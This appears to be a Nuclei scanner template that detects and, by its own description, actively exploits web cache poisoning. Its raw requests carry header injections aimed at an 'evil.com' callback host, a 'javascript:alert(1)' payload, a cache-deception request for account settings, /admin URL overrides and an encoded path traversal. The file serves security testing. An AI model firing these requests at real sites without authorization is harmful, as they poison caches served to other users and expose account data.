http:
- matchers:
  - dsl:
    - (contains(body_2, "host-{{poison_id}}") || contains(body_2, "{{callback}}.evil.com"))
      && !contains(body_1, "host-{{poison_id}}")
    type: dsl
  raw:
  - 'GET /?cachebuster={{cache_buster}} HTTP/1.1

    Host: {{callback}}.evil.com

    X-Forwarded-Host: {{callback}}

    X-Host: {{callback}}/host-{{poison_id}}

    X-Forwarded-Server: {{callback}}

    X-HTTP-Host-Override: {{callback}}

    Connection: close

    '
  - 'GET /?cachebuster={{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
- matchers:
  - dsl:
    - (contains(body_2, "xss-{{poison_id}}") || contains(body_2, "javascript:alert(1)"))
      && !contains(body_1, "xss-{{poison_id}}")
    type: dsl
  raw:
  - 'GET /test{{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-Proto: http

    X-Forwarded-Scheme: http://{{callback}}/xss-{{poison_id}}

    X-Forwarded-Protocol: javascript:alert(1)

    Connection: close

    '
  - 'GET /test{{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
- matchers:
  - dsl:
    - '(contains(tolower(body_2), "email") || contains(tolower(body_2), "password")
      || contains(tolower(body_2), "token")) && contains(tolower(header_2), "content-type:
      text/css")'
    type: dsl
  raw:
  - 'GET /account/settings/{{cache_buster}}.css HTTP/1.1

    Host: {{Hostname}}

    Cookie: session=admin

    Accept: text/css

    Connection: close

    '
  - 'GET /account/settings/{{cache_buster}}.css HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - part: interactsh_request
    type: word
    words:
    - poison-{{poison_id}}
  matchers-condition: and
  raw:
  - 'GET /?cachebuster={{cache_buster}}&poison={{callback}}/poison-{{poison_id}} HTTP/1.1

    Host: {{Hostname}}

    X-Original-URL: /admin

    X-Rewrite-URL: /admin

    Connection: close

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
- matchers:
  - dsl:
    - contains(body_2, "pp-{{poison_id}}") && !contains(body_1, "pp-{{poison_id}}")
    type: dsl
  raw:
  - 'GET /?param={{callback}}&cb={{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    X-HTTP-Method-Override: POST

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 50

    Connection: close


    utm_source={{callback}}/pp-{{poison_id}}&callback={{callback}}/pp-{{poison_id}}

    '
  - 'GET /?cb={{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
- matchers:
  - dsl:
    - status_code_1 == status_code_2 && (contains(tolower(body_1), "admin") || contains(tolower(body_1),
      "dashboard") || contains(tolower(body_1), "unauthorized"))
    type: dsl
  raw:
  - 'GET /api/v1%2f..%2f..%2fadmin?cb={{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
  - 'GET /api/v1/../../admin?cb={{cache_buster}} HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
id: web-cache-poisoning-real
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L
    cvss-score: 8.3
    cwe-id: CWE-444,CWE-524
  description: 'Detects and exploits ACTUAL web cache poisoning vulnerabilities by
    injecting

    headers and parameters that get cached and reflected to other users. Tests

    multiple poisoning vectors including Host header injection, X-Forwarded headers,

    and cache key manipulation.

    '
  name: Web Cache Poisoning with Exploitation Verification
  reference:
  - https://portswigger.net/research/web-cache-entanglement
  - https://portswigger.net/research/practical-web-cache-poisoning
  severity: high
  tags: cache,poisoning,injection,high
variables:
  cache_buster: '{{rand_int(10000, 99999)}}'
  callback: '{{interactsh-url}}'
  poison_id: '{{randstr}}'
